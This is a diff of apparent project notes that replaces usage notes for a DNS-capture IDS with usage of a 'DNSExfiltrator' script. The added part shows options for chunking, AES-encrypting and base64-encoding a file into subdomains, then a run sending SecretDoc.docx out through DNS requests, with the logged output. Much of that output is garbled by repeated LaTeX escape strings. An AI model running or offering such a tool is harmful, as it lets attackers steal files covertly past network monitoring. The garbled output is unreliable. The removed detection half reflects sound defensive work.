@@ -1,38 +1,48 @@
-./IDS
-################################# USAGE ###################################
--i = list available interfaces
--b = bind to chosen interface
--f = pcap file for input
-###########################################################################
+cd DNSExfiltrator
+python3 main.py -h
+usage: main.py [-h] [-d DOMAIN] [-f FILENAME] [-a AESENCRYPT] [-t SENDDELAY]
 
-./IDS -i
-
-%fix
-
-sudo ./IDS -b eth0
-Interface Connected Successfully: ens33
-Scanning... CTRL+C To Stop Packet Capture
----> ./rawCap.log   (\& if pcapSave is on dnsCap.pcap)
-
-rawCap.log
-    YidQS1x4MDNceDA0XG4n.irsjryp.com:192.168.126.128:192.168.1.1:1619089298
-    YidceDAwXHgwMFx4MDBceDAwXHgwMFx4ODdOXHhlMkBceDAwJw==.pwhsufhy.com:192.168.126.128:192.168.1.1:1619089298
-    YidceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwJw==.ygrynag.com:192.168.126.128:192.168.1.1:1619089298
-    YidceDAwXHRceDAwXHgwMFx4MDBkb2NQcic=.vuuknqvnqj.com:192.168.126.128:192.168.1.1:1619089298
-    YidvcHMvUEtceDAzXHgwNFx4MTRceDAwJw==.zeulph.com:192.168.126.128:192.168.1.1:1619089298
-    YidceDAwXHgwMFx4MDhceDAwXHg4N05ceGUyQFx4OTVceGRkJw==.gvhbcgvvys.com:192.168.126.128:192.168.1.1:1619089298
-    YidHX1xcXHgwMVx4MDBceDAwcFx4MDJceDAwXHgwMCc=.fqlbgu.com:192.168.126.128:192.168.1.1:1619089298
-    YidceDEwXHgwMFx4MDBceDAwZG9jUHJvJw==.ocunht.com:192.168.126.128:192.168.1.1:1619089298
-    Yidwcy9hcHAueG1sJw==.fgceihg.com:192.168.126.128:192.168.1.1:1619089299
-    YidceDlkXHg5MVx4YzFuXHhjMjBceDEwRFx4ZWZceDk1Jw==.cejtcdwnic.com:192.168.126.128:192.168.1.1:1619089299
-    YidceGZhXHgwZlFceGVlXHg4OVx4OWRAXHg4MCJjJw==.cdfwkz.com:192.168.126.128:192.168.1.1:1619089299
-    YidEQzlVLVx4MTJceGExXHgxY1x4OTFceGU1Jw==.csjifv.com:192.168.126.128:192.168.1.1:1619089299
-    YicsXHhjNGpiW1x4YjZBXHhmMFx4Zjd1Jw==.tdifwdixs.com:192.168.126.128:192.168.1.1:1619089299
-    YidIXHgwNVx4ZTlceGI1XHhiN1x4OWRZeVx4ZmNceGI0Jw==.mumqe.com:192.168.126.128:192.168.1.1:1619089299
-    YidDXHhlNlx4OTdceGE2XHgwZVx4Y2VgXHhhY1ByJw==.rfihd.com:192.168.126.128:192.168.1.1:1619089299
-    YidceDE2JjFceDBlXHgwM1x4OTBcXFx4OTVCXHgxZSc=.vnbygr.com:192.168.126.128:192.168.1.1:1619089299
-    ...
+optional arguments:
+  -h, --help            show this help message and exit
+  -d DOMAIN, --domain DOMAIN
+                        Domain required to append malformed subdomain to
+  -f FILENAME, --filename FILENAME
+                        Optional - Instead of a static phrase, a file can be segmented and pushed
+  -a AESENCRYPT, --aesencrypt AESENCRYPT
+                        Apply AES encryption before base64, specifying a 16 bit key - e.g give1stclassPlss
+  -t SENDDELAY, --senddelay SENDDELAY
+                        Slow rate of fire of UDP messages (seconds)
 
 
-./IDS -f dnsCap.pcap
-%dodgy as far as 22/04/21 - I might need to roll the IDS back a bit and test it - seg fault
+python3 main.py -f SecretDoc.docx
+
+TRANSMISSION MAY HALT FOR A SECOND OR SO OCCASIONALLY, BE PATIENT!
+
+FILE TUNNEL MODE ENABLED - THE FILE WILL BE TRANSMITTED VIA DNS REQUESTS
+
+Domain to tag: spnutn.com
+DNS Server: 192.168.1.1:53
+File Fragmented: SecretDoc.docx
+Provided: b'PK\x03\x04\n'     Encoded URL: YidQS1x4MDNceDA0XG4n.spnutn.com
+Sent DNS exfiltrated portion!
+
+Domain to tag: htzsfdcx.com
+DNS Server: 192.168.1.1:53
+File Fragmented: SecretDoc.docx
+Provided: b'\textbackslash{}x00\textbackslash{}x00\textbackslash{}x00\textbackslash{}x00\textbackslash{}x00\textbackslash{}textbackslash{}x87N\textbackslash{}textbackslash{}xe2@\textbackslash{}textbackslash{}x00'     Encoded URL: YidceDAwXHgwMFx4MDBceDAwXHgwMFx4ODdOXHhlMkBceDAwJw==.htzsfdcx.com
+Sent DNS exfiltrated portion!
+
+Domain to tag: htmrbek.com
+DNS Server: 192.168.1.1:53
+File Fragmented: SecretDoc.docx
+Provided: b'\textbackslash{}x00\textbackslash{}x00\textbackslash{}x00\textbackslash{}x00\textbackslash{}x00\textbackslash{}x00\textbackslash{}x00\textbackslash{}x00\textbackslash{}x00\textbackslash{}x00'     Encoded URL: YidceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwJw==.htmrbek.com
+Sent DNS exfiltrated portion!
+
+Domain to tag: kyljdnh.com
+DNS Server: 192.168.1.1:53
+File Fragmented: SecretDoc.docx
+Provided: b'\textbackslash{}x00\textbackslash{}t\textbackslash{}x00\textbackslash{}x00\textbackslash{}x00docPr'     Encoded URL: YidceDAwXHRceDAwXHgwMFx4MDBkb2NQcic=.kyljdnh.com
+Sent DNS exfiltrated portion!
+
+...
+
